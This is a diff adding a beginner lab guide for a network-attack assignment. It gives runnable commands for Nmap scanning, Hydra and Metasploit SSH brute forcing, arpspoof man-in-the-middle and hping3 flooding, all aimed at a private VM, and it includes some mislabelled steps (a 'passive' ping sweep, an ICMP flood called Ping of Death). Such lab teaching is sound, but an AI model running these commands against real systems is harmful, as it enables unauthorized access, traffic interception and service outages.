@@ -1,0 +1,243 @@
+# Cybersecurity Lab Guide: Reconnaissance & Access Attack Simulation
+
+This is a beginner-friendly walkthrough for your controlled VM lab environment, mapped to your assignment's Task 3 (Simulate Network Attacks) requirements.
+
+---
+
+## Prerequisites
+
+- **Attacker VM:** Kali Linux @ 192.168.56.102
+- **Victim VM:** Any Linux/Windows @ 192.168.56.101
+- Both VMs on the same Host-Only network in VirtualBox/VMware
+- Tools needed: Nmap, Metasploit, Wireshark (all pre-installed on Kali)
+
+---
+
+## PHASE 1: RECONNAISSANCE
+
+This maps to your assignment's **"Reconnaissance: Use Nmap or Netcat to perform a port scan on a mock network"** requirement.
+
+### Step 1 — Verify Network Connectivity
+
+Open a terminal on your Kali attacker VM and confirm you can reach the victim:
+
+```bash
+ping 192.168.56.101 -c 4
+```
+
+You should see replies. If not, check your VM network adapter settings (both must be Host-Only).
+
+---
+
+### Step 2 — Basic Host Discovery (Passive Recon)
+
+```bash
+# Discover all live hosts on the subnet
+nmap -sn 192.168.56.0/24
+```
+
+**What this does:** Sends ARP/ICMP pings to find which hosts are alive. Record which IPs respond — this is what an attacker does first.
+
+**Expected output:**
+```
+Nmap scan report for 192.168.56.101
+Host is up (0.0012s latency).
+```
+
+---
+
+### Step 3 — Port Scanning (Active Recon)
+
+```bash
+# Basic TCP port scan — find open ports
+nmap -sT 192.168.56.101
+```
+
+```bash
+# More detailed scan — service versions + OS detection
+nmap -sV -O 192.168.56.101
+```
+
+```bash
+# Aggressive scan — combines OS, version, scripts, traceroute
+nmap -A 192.168.56.101
+```
+
+**What to record for your report:**
+- Open ports (e.g., 22=SSH, 80=HTTP, 3306=MySQL, 445=SMB)
+- Operating system guess
+- Service versions running
+
+---
+
+### Step 4 — Save Scan Results to File
+
+```bash
+# Save output for your report
+nmap -A 192.168.56.101 -oN recon_results.txt
+
+# View the saved file
+cat recon_results.txt
+```
+
+---
+
+### Step 5 — Capture Recon Traffic with Wireshark
+
+On your attacker VM, open Wireshark before running scans:
+
+```bash
+# Open Wireshark (GUI)
+wireshark &
+```
+
+1. Select your network interface (usually `eth0` or `enp0s3`)
+2. Click the blue shark fin to start capture
+3. Run your Nmap scans in the terminal
+4. In Wireshark filter bar, type: `ip.addr == 192.168.56.101`
+5. Save capture: File → Save As → `recon_capture.pcap`
+
+This `.pcap` file is your **simulation file** required by your assignment submission.
+
+---
+
+## PHASE 2: ACCESS ATTACK
+
+This maps to **"Access Attacks: Attempt a simulated password cracking or spoofing attack"**.
+
+### Option A — SSH Brute Force (Password Cracking)
+
+This simulates an attacker trying common passwords against SSH.
+
+```bash
+# Install hydra if not present
+apt-get install hydra -y
+
+# Create a simple password list
+echo -e "password\n123456\nadmin\nroot\nletmein\ntoor" > passwords.txt
+
+# Create a username list
+echo -e "root\nadmin\nuser\nkali" > usernames.txt
+
+# Run the brute force attack
+hydra -L usernames.txt -P passwords.txt ssh://192.168.56.101 -t 4 -V
+```
+
+**What `-t 4` means:** Use 4 threads (slow it down to avoid overwhelming your VM).
+
+**What to record:** Which username/password combination succeeded (if any).
+
+---
+
+### Option B — Metasploit SSH Login Scanner
+
+```bash
+# Launch Metasploit
+msfconsole
+
+# Inside Metasploit, use the SSH login scanner
+use auxiliary/scanner/ssh/ssh_login
+
+# Configure target
+set RHOSTS 192.168.56.101
+set RPORT 22
+
+# Set credentials to try
+set USERNAME root
+set PASSWORD toor
+
+# Or use files
+set USER_FILE /root/usernames.txt
+set PASS_FILE /root/passwords.txt
+
+# Run it
+run
+```
+
+---
+
+### Option C — ARP Spoofing (Man-in-the-Middle)
+
+This directly maps to **ARP Cache Poisoning** from your Cisco Module 17 reference material.
+
+```bash
+# Enable IP forwarding so traffic still flows (victim won't notice)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Install arpspoof if needed
+apt-get install dsniff -y
+
+# Open TWO terminals
+
+# Terminal 1 — Tell victim (101) that YOU are the gateway
+arpspoof -i eth0 -t 192.168.56.101 192.168.56.1
+
+# Terminal 2 — Tell gateway that YOU are the victim
+arpspoof -i eth0 -t 192.168.56.1 192.168.56.101
+```
+
+While ARP spoofing is running, open Wireshark to capture intercepted traffic. Filter with `arp` to see the poisoned ARP replies.
+
+**Stop the attack:** Press `Ctrl+C` in both terminals when done.
+
+---
+
+### Option D — DoS Attack (SYN Flood)
+
+This maps to **"DoS/DDoS Attacks: Ping of Death or SYN Flood"** from your assignment.
+
+```bash
+# Using hping3 (pre-installed on Kali)
+# SYN flood — sends rapid TCP SYN packets with spoofed source IPs
+hping3 -S --flood -V -p 80 192.168.56.101
+```
+
+**Stop after 10–15 seconds** with `Ctrl+C`. Check your Wireshark capture to see the flood.
+
+```bash
+# Ping of Death variant
+hping3 --icmp --flood 192.168.56.101
+```
+
+---
+
+## PHASE 3: CAPTURE EVIDENCE FOR REPORT
+
+### What to Screenshot / Save
+
+```bash
+# 1. Save all Nmap results
+nmap -A 192.168.56.101 -oX recon_results.xml -oN recon_results.txt
+
+# 2. View open ports clearly
+nmap --open 192.168.56.101
+
+# 3. Check ARP table (shows poisoned entries during ARP attack)
+arp -a
+
+# 4. List saved pcap files
+ls -la *.pcap
+```
+
+---
+
+## Summary Table for Your Report
+
+| Phase | Tool Used | Attack Type | Evidence File |
+|---|---|---|---|
+| Recon | Nmap | Port Scan | recon_results.txt |
+| Recon | Wireshark | Traffic Capture | recon_capture.pcap |
+| Access | Hydra/Metasploit | Brute Force | Terminal screenshot |
+| Access | arpspoof | ARP Poisoning / MiTM | Wireshark ARP filter |
+| DoS | hping3 | SYN Flood | Wireshark capture |
+
+---
+
+## Important Reminders
+
+- **Only run these on your own lab VMs** — never on real networks or devices you don't own
+- After each attack, **restore ARP tables** by stopping arpspoof (it auto-restores)
+- Re-enable IP forwarding back to 0 after MiTM: `echo 0 > /proc/sys/net/ipv4/ip_forward`
+- All `.pcap` and `.txt` files are your **simulation files** for submission
+
+This covers Tasks 3 and 4 of your assignment (simulation + defense implementation comes next using `iptables` and Snort/Suricata).
